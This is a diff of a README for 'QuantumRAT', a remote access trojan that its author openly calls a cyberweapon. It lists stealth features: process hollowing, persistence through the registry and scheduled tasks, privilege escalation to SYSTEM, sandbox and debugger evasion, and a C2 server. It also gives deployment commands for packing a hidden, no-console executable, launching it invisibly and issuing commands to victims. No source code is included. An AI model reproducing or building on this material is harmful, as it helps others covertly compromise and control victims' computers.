@@ -1,53 +1,71 @@
-# QuantumRAT
+QuantumRAT
+By MR MONSIF H4CK3R
 
-## Nuclear Features
+Nuclear Features
+Quantum Encryption Protocol
 
-- Quantum Encryption Protocol  
-- Hybrid RSA-4096 + AES-256-CBC encryption  
-- Per-session key rotation  
-- SSL-pinned command channel  
-- Stealth Deployment System  
-- Process hollowing via trusted binaries  
-- Registry + scheduled task persistence  
-- Hidden console window (zero UI)  
-- Anti-forensic self-destruct  
-- God Mode Execution  
-- Full system command execution  
-- Privilege escalation to SYSTEM  
-- Background process injection  
-- Auto-reconnect with exponential backoff  
+Hybrid RSA-4096 + AES-256-CBC encryption
 
-## Advanced Evasion Tactics
+Per-session key rotation
 
-- VM / sandbox detection (10+ techniques)  
-- Debugger detection (IsDebuggerPresent)  
-- Behavioral analysis countermeasures  
-- Encrypted string obfuscation  
+SSL-pinned command channel
 
-## Military-Grade C2 Server
+Stealth Deployment System
 
-- SSL-pinned communications  
-- Threaded client handling  
-- Real-time command execution  
-- Session key management  
+Process hollowing via trusted binaries
 
-## Execution Workflow
+Registry + scheduled task persistence
 
-### Diagram  
-_(Include your architecture diagram here or link it)_
+Hidden console window (zero UI)
 
-### Code  
+Anti-forensic self-destruct
 
-### Deployment Guide
+God Mode Execution
 
-#### Generate Certificates  
-```bash
+Full system command execution
+
+Privilege escalation to SYSTEM
+
+Background process injection
+
+Auto-reconnect with exponential backoff
+
+Advanced Evasion Tactics
+VM/sandbox detection (10+ techniques)
+
+Debugger detection (IsDebuggerPresent)
+
+Behavioral analysis countermeasures
+
+Encrypted string obfuscation
+
+Military-Grade C2 Server
+SSL-pinned communications
+
+Threaded client handling
+
+Real-time command execution
+
+Session key management
+
+Execution Workflow
+Diagram
+
+Code
+
+Deployment Guide
+
+Generate Certificates
+bash
+Copy
+Edit
 openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
 Compile RAT
 bash
 Copy
 Edit
-pip install pyinstaller pycryptodome  
+pip install pyinstaller pycryptodome
+
 pyinstaller --onefile --noconsole --add-data "server.crt;." --upx-dir=./upx QuantumRAT.py
 Launch C2 Server
 bash
@@ -59,8 +77,8 @@ powershell
 Copy
 Edit
 Start-Process -WindowStyle Hidden .\dist\QuantumRAT.exe
-Command Center Operations
-text
+Command Center Operations Examples
+shell
 Copy
 Edit
 QuantumRAT> whoami /all  
@@ -92,9 +110,7 @@ Behavioral pattern randomization
 
 No suspicious API calls
 
-python
-Copy
-Edit
-# WARNING: THIS CYBERWEAPON VIOLATES INTERNATIONAL LAWS  
-# MR MONSIF DISAPPEARS INTO THE QUANTUM FIELD
-Created by MR MONSIF H4CK3R
+WARNING: THIS CYBERWEAPON VIOLATES INTERNATIONAL LAWS
+
+MR MONSIF DISAPPEARS INTO THE QUANTUM FIELD
+
